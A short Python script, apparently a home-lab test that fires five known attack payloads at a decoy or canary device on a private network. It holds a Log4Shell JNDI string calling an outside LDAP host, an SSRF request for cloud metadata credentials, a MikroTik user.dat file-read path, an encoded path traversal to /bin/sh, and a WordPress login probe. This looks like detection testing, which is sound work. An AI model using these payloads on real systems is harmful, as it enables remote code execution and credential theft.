import urllib.request
import urllib.parse
import time

esp_ip = "192.168.0.112"
print("[+] FIRING CVE ARSENAL STRESS TEST FROM PENTEST NODE (LXC 123)...")

# 1. Log4j / JNDI Remote Code Execution (CVE-2021-44228)
print("\n[*] [CVE-1] Triggering Log4Shell JNDI Injection...")
try:
    data = urllib.parse.urlencode({"user": "${jndi:ldap://192.168.0.155:1389/Exploit}", "pass": "test"}).encode()
    req = urllib.request.Request("http://" + esp_ip + "/login", data=data)
    with urllib.request.urlopen(req, timeout=2) as resp:
        print("    [-] HTTP Response:", resp.status)
except Exception as e:
    print("    [-] Handled:", e)

time.sleep(2)

# 2. SSRF Cloud Metadata Exfiltration (AWS/GCP/Kubernetes Metadata API)
print("\n[*] [CVE-2] Triggering Cloud SSRF Metadata Theft...")
try:
    data = urllib.parse.urlencode({"fetch_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}).encode()
    req = urllib.request.Request("http://" + esp_ip + "/login", data=data)
    with urllib.request.urlopen(req, timeout=2) as resp:
        print("    [-] HTTP Response:", resp.status)
except Exception as e:
    print("    [-] Handled:", e)

time.sleep(2)

# 3. MikroTik Winbox Exploit File Leak (CVE-2018-14847)
print("\n[*] [CVE-3] Triggering MikroTik Winbox Arbitrary File Read...")
try:
    data = urllib.parse.urlencode({"path": "/winbox/user.dat"}).encode()
    req = urllib.request.Request("http://" + esp_ip + "/login", data=data)
    with urllib.request.urlopen(req, timeout=2) as resp:
        print("    [-] HTTP Response:", resp.status)
except Exception as e:
    print("    [-] Handled:", e)

time.sleep(2)

# 4. Apache Encoded Path Traversal (CVE-2021-41773 / %2e%2e RCE)
print("\n[*] [CVE-4] Triggering Encoded Path Traversal (%2e%2e/bin/sh)...")
try:
    data = urllib.parse.urlencode({"exec": "/icons/%2e%2e/%2e%2e/%2e%2e/bin/sh"}).encode()
    req = urllib.request.Request("http://" + esp_ip + "/login", data=data)
    with urllib.request.urlopen(req, timeout=2) as resp:
        print("    [-] HTTP Response:", resp.status)
except Exception as e:
    print("    [-] Handled:", e)

time.sleep(2)

# 5. WordPress Admin Canary Probe
print("\n[*] [CVE-5] Triggering WordPress Decoy Login Brute-force...")
try:
    req = urllib.request.Request("http://" + esp_ip + "/wp-login.php")
    with urllib.request.urlopen(req, timeout=2) as resp:
        print("    [-] Decoy Page Loaded:", resp.status)
except Exception as e:
    print("    [-] Handled:", e)

print("\n[+] All 5 CVE Attack Vectors Fired Successfully.")
